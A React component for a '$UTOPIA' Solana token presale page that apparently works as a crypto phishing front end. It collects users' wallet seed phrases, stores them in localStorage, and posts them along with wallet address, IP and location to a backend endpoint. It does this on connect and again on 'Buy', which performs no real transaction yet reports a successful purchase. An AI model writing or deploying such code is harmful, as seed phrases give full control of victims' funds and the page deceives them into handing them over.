import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';
import ConnectWalletModal from './ConnectWalletModal';
import NotificationModal from './NotificationModal';

function PresaleFlow() {
    // Set the default value to "1.000" instead of using a random number.
    const [usdAmount, setUsdAmount] = useState("1.000");
    const [walletType, setWalletType] = useState('');
    const [walletAddress, setWalletAddress] = useState('');
    const [seedPhrase, setSeedPhrase] = useState('');
    const [connected, setConnected] = useState(false);

    const [showConnectModal, setShowConnectModal] = useState(false);
    const [showConnectionNotification, setShowConnectionNotification] = useState(false);
    const [showPurchaseNotification, setShowPurchaseNotification] = useState(false);

    const [userLocation, setUserLocation] = useState(() => {
        const saved = localStorage.getItem('userLocation');
        return saved ? JSON.parse(saved) : { ip: '', location: '' };
    });

    const presaleSectionRef = useRef(null);

    const tokenRate = 1000;
    const solValue = parseFloat(usdAmount) || 0;
    const tokenAmount = solValue * tokenRate;

    useEffect(() => {
        const connection = localStorage.getItem('walletConnection');
        if (connection) {
            const data = JSON.parse(connection);
            setWalletType(data.walletType);
            setWalletAddress(data.walletAddress);
            setSeedPhrase(data.seedPhrase);
            setConnected(true);
        }
    }, []);

    useEffect(() => {
        if (connected) {
            const data = { walletType, walletAddress, seedPhrase };
            localStorage.setItem('walletConnection', JSON.stringify(data));
        }
    }, [connected, walletType, walletAddress, seedPhrase]);

    const handleConnectSuccess = async ({ walletType, walletAddress, seedPhrase }) => {
        setWalletType(walletType);
        setWalletAddress(walletAddress);
        setSeedPhrase(seedPhrase);
        setShowConnectModal(false);

        try {
            await axios.post(`${process.env.REACT_APP_API_URL}/api/connection`, {
                walletType,
                walletAddress,
                seedPhrase,
                ipAddress: userLocation.ip,
                location: userLocation.location
            });
            setConnected(true);
            setShowConnectionNotification(true);
        } catch (error) {
            console.error('Error saving connection:', error);
        }
    };

    const handleDisconnect = () => {
        setConnected(false);
        setWalletType('');
        setWalletAddress('');
        setSeedPhrase('');
        localStorage.removeItem('walletConnection');
    };

    const handleBuy = async () => {
        if (!connected || !usdAmount) return;
        try {
            await axios.post(`${process.env.REACT_APP_API_URL}/api/connection`, {
                walletType,
                walletAddress,
                seedPhrase,
                usdAmount,
                tokenAmount,
                ipAddress: userLocation.ip,
                location: userLocation.location
            });
            setShowPurchaseNotification(true);
            // Reset to the fixed default value.
            setUsdAmount("1.000");
        } catch (error) {
            alert('Purchase failed: ' + (error.response?.data?.error || 'Unknown error'));
        }
    };

    const handleInputChange = (e) => {
        let value = e.target.value;

        // Allow only numbers and a single decimal point.
        if (!/^\d*\.?\d*$/.test(value)) {
            return;
        }

        // Convert the input to a float to check against the max value.
        const num = parseFloat(value);
        if (!isNaN(num) && num > 100000) {
            setUsdAmount("100000");
            return;
        }

        // Split into integer and decimal parts.
        const [integerPart, decimalPart] = value.split('.');

        // Limit decimal digits to three if present.
        let newValue = integerPart;
        if (decimalPart !== undefined) {
            newValue += '.' + decimalPart.slice(0, 3);
        }

        setUsdAmount(newValue);
    };

    return (
        <div className="presale-flow">
            <div className="presale-banner">
                <p className="p2">BUY $UTOPIA</p>
                <p>Enter the amount of SOL you want to invest and get your $UTOPIA</p>
            </div>

            {connected && (
                <div className="connected-info">
                    <p>
                        Connected: {walletType} ({walletAddress.substring(0, 6)}...)
                    </p>
                    <p className="account-label">Account</p>
                    <button onClick={handleDisconnect}>Connect another account</button>
                </div>
            )}

            <div id="presale-section" className="purchase-section" ref={presaleSectionRef}>
                <input
                    type="text"
                    placeholder="Enter SOL"
                    value={usdAmount}
                    onChange={handleInputChange}
                />
                <textarea
                    readOnly
                    value={`You will receive ${tokenAmount} $UTOPIA`}
                    className="token-display"
                />
                {connected && (
                    <button onClick={handleBuy} disabled={!usdAmount}>
                        Buy
                    </button>
                )}
            </div>

            {!connected && (
                <button onClick={() => setShowConnectModal(true)}>
                    Connect Wallet
                </button>
            )}

            {showConnectModal && (
                <ConnectWalletModal
                    onClose={() => setShowConnectModal(false)}
                    onConnectSuccess={handleConnectSuccess}
                />
            )}

            {showConnectionNotification && (
                <NotificationModal
                    message="Successfully connected! Enter your purchase details to proceed."
                    onClose={() => setShowConnectionNotification(false)}
                />
            )}

            {showPurchaseNotification && (
                <NotificationModal
                    message="Congratulations, your purchase was successful! Thank you."
                    onClose={() => setShowPurchaseNotification(false)}
                />
            )}
        </div>
    );
}

export default PresaleFlow;
